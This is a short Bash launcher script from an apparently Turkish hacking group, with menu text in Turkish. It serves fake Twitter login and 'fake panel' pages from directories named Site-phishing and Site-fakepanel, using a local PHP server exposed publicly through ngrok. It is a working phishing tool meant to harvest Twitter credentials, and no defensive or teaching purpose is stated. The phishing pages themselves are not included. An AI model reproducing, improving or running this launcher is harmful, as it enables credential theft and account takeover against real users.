!/bin/bash

#Code:MR.Neowise
#Youtube : Serhat Türk
clear
echo -e  "


\e[35m     ((( #Turkish Cyber Team 🇹🇷  #MR.Neowise )))



\e[31m[01]\e[32m Twitter Login
\e[31m[02]\e[32m Twitter Fake Panel


\e[31m[00]\e[37m Menü
\e[31m[99]\e[37m Exit
"
echo -e "\e[49m"
read -p "İşlem Numarası: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: twitter01"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-phishing/
	php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[ $islem == 2 || $islem == 02 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: twitter02"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-fakepanel/
	php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 0 || $islem == 00 ]]; then
cd ..
cd ..
bash hasaki.sh
elif [[ $islem == 9 || $islem == 99 ]]; then
echo -e "\e[31mMR.Neowise İyi Günler Diler 🇹🇷 "
sleep 1
clear
exit 1
else
echo ""
echo -e "\e[31m Hata! Code Numarasını Kontrol Ediniz...."
sleep 3
clear
bash start.sh
fi
